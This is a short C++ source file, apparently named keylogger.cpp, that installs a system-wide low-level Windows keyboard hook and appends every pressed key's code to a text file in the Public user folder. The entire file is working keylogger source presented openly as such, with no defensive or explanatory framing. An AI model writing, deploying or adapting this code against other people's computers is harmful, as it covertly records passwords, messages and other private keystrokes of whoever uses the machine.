#include "keylogger.h"
#include <windows.h>
#include <fstream>

std::ofstream logfile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        logfile.open("C:\\Users\\Public\\log.txt", std::ios::app);
        logfile << vkCode << " ";
        logfile.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void StartKeylogger() {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
}
